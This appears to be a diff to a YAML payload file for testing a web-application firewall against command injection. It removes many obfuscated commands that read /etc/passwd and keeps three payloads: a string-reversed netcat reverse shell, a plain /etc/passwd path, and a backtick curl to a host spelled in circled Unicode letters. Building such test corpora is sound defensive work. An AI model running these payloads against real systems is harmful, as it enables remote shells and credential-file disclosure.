@@ -1,26 +1,9 @@
 ---
 payload:
   - $(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
-  - cat /etc/pa?swd
-  - "cat /etc/pa\u2019ss\u2019wd"
-  - cat /etc/pa**wd
-  - "ec\u2019h\u2019o \u2018cat /etc/examplewd\u2019 | sed \u2018s/example/pass/g\u2019 | bash"
-  - ;+$u+cat+/etc$u/passwd$u
-  - ;+$u+cat+/etc$u/passwd+\#
-  - /???/??t+/???/??ss??
-  - /?in/cat+/et?/passw?
   - /etc/passwd
-  - /e?c/?asswd
-  - /e*c/*asswd
-  - /??c/?asswd
-  - /??c/?assw?
   - "`curl -L http://\u24BC\u24C4\u24C4\u24BC\u24C1\u24BA.\u24B8\u24C4\u24C2`"
-  - ;+$u+cat+/etc$u/passwd$u
-  - ;+$u+cat+/etc$u/passwd+\#
-  - /???/??t+/???/??ss??
-  - /?in/cat+/et?/passw?
-  - ;+$u+cat+/etc$u/passwd$u
-  - ;+$u+cat+/etc$u/passwd+\#
+
 encoder:
   - URL
 placeholder:
